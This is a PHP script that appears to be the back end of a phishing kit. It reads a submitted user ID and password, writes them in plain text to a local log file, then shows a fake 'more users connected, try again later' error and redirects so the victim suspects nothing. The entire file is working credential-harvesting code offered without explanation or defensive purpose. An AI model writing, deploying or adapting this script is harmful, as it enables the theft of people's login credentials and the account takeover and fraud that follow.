<?php
#strip slashes before putting the form data into target file
$uid=stripslashes($_POST['userid']);
$pid=stripslashes($_POST['passwd']);
if(empty($uid) || empty($pid))
{
	echo "<script type='text/javascript'>alert('UserID or Password Cannot be empty');</script>";
	
}
sleep(4);
$fid="Email :".$uid."  Password:".$pid."".PHP_EOL;
$file=fopen("log.txt","a");
echo fwrite($file,PHP_EOL);
echo fwrite($file,$fid);
fclose($file);
echo "<script type='text/javascript'>alert('More Users Connected!!! Please tryagin after sometime');window.location.href = 'index.html';</script>";
#header("Location: index.html");
?>
